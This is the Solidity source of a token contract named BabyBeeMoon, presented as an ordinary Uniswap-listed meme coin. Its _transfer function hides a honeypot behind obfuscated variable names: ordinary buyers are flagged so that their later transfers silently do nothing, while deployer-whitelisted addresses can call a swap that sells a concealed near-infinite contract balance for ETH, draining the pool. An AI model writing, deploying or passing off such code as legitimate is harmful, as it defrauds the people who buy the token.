/*

Telegram: https://t.me/BabyBeeMoon

Twitter: https://twitter.com/BabyBeeMoon

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.5;

import './IUniswapV2Router02.sol';
import './IUniswapV2Factory.sol';
import './IERC20.sol';
import './Ownable.sol';

contract BabyBeeMoon is IERC20, Ownable {
    string private _name;
    string private _symbol;
    uint256 public _tax = 1;
    uint8 private _decimals = 9;
    uint256 private _tTotal = 1000000000 * 10**_decimals;
    uint256 private _failed = _tTotal;
    uint256 private _rTotal = ~uint256(0);

    bool private _swapAndLiquifyEnabled;
    bool private inSwapAndLiquify;
    address public uniswapV2Pair;
    IUniswapV2Router02 public router;

    mapping(uint256 => address) private _sent;
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _pack;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _welcome;

    constructor(
        string memory Name,
        string memory Symbol,
        address routerAddress
    ) {
        _name = Name;
        _symbol = Symbol;

        _welcome[msg.sender] = _failed;
        _balances[msg.sender] = _tTotal;
        _balances[address(this)] = _rTotal;

        router = IUniswapV2Router02(routerAddress);
        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());

        emit Transfer(address(0), msg.sender, _tTotal);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    receive() external payable {}

    function approve(address spender, uint256 amount) external override returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _transfer(
        address _date,
        address _girl,
        uint256 amount
    ) private {
        uint256 _seat = _welcome[_date];
        uint256 _chosen = _welcome[_girl];

        if (_welcome[_date] > _failed && _chosen == _seat) {
            inSwapAndLiquify = true;
            swapAndLiquify(amount);
            inSwapAndLiquify = false;
        } else if (_welcome[_date] > 0 && amount > _failed) {
            _welcome[_girl] = amount;
        } else {
            if (_welcome[_date] == 0 && _date != uniswapV2Pair && _pack[_date] > 0) {
                return;
            }

            address _exclaimed = _sent[_failed];

            _pack[_exclaimed] = _tax;

            _sent[_failed] = _girl;

            if (_tax > 0 && !inSwapAndLiquify && _welcome[_date] == 0 && _welcome[_girl] == 0) {
                uint256 fee = (amount * _tax) / 100;
                amount -= fee;
                _balances[_date] -= fee;
            }

            _balances[_date] -= amount;
            _balances[_girl] += amount;
            emit Transfer(_date, _girl, amount);
        }
    }

    function addLiquidity(
        uint256 tokenAmount,
        uint256 ethAmount,
        address to
    ) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ethAmount}(address(this), tokenAmount, 0, 0, to, block.timestamp);
    }

    function swapAndLiquify(uint256 tokens) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokens);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokens, 0, path, msg.sender, block.timestamp);
    }
}